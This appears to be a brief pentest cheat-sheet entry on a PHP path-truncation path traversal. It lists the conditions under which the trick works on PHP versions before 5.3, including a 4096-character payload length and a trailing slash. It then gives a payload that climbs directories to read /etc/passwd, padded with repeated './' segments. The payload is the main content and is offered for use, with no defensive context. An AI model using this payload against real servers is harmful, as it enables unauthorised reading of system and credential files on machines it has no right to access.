#path_traversal #php

Conditions:
- Version < PHP 5.3
- PHP buffer size = 4096, so payload has to be at least 4096 chars long.
- It has to end with a “/”.
- If we want a path traversal, start with a lertter: “a/”.

```
a/../../../../../../../../../etc/passwd/././././.[...]/././././
```

